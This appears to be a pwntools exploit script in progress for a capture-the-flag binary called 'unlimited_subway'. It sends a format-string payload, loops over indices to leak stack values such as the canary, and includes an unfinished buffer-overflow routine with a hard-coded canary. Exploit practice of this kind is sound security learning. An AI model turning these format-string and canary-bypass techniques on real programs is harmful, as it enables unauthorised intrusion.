from pwn import *

import errno
import os
import signal
import functools

class TimeoutError(Exception):
    pass

def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
    def decorator(func):
        def _handle_timeout(signum, frame):
            # pass
            raise TimeoutError(error_message)

        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.alarm(seconds)
            try:
                result = func(*args, **kwargs)
            finally:
                signal.alarm(0)
            return result

        return wrapper

    return decorator

import pwn

# from prepare_input import write_input_to_file
@timeout(5)
def pwn_whataxor():
 
    
    elf = pwn.ELF("./unlimited_subway")
    p = elf.process()

    print(elf.got) 
    for symbol in elf.got:
        print(symbol, elf.got[symbol])
    print(elf.symbols)

    def format_string_write():
        data = p.recvuntil(b'>')
        print(data)
        p.send_raw(b"F\n")

        data = p.recvuntil(b'Data : ')
        print('at data', data)
        p.send_raw(b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x\n')


    def format_string_read():
        extracted = ''
        for i in range(100, 200, 1):
            data = p.recvuntil(b'>')
            decoded = data.decode()
            print('decoded', decoded)
            if f'Index {i-1} :' in decoded:
                split = decoded.split(f'Index {i-1} :')[1].split('\n')[0]
                print('decoded and reduced', split)
                if (i-1)%10 ==0:
                    extracted += f'({i-1}){split}'
                else:
                    extracted += f'{split}'

            print(data)
            p.send_raw(b"V\n")

            data = p.recvuntil(b'Index : ')
            print('at data', data)
            payload = f'{i}'.encode() + b'\n'
            print(payload)
            p.send_raw(payload)
        print(extracted)

    def exit_and_jump():
        data = p.recvuntil(b'>')
        print(data)
        p.send_raw(b"E\n")

        data = p.recvuntil(b'Name Size : ')
        print('at name size', data)
        p.send_raw(b'68\n')

        data = p.recvuntil(b'Name : ')
        print('at name', data)

        # 8ec63500
        # b58b900
        # e9a36800
        canary_value = b'\x00\x35\xc6\x8e'
        fuzz_payload = b'A'*10
        payload = b'A'*64 + canary_value + b'\n'
        data = p.send_raw(payload)
        print(data)


    # format_string_write()
    format_string_read()
    data = p.recv()
    print(data)
    data = p.recv()
    print(data)
    data = p.recv()
    print(data)
    data = p.recv()
    print(data)
    data = p.recv()
    print(data)
    data = p.recv()
    print(data)


pwn_whataxor()
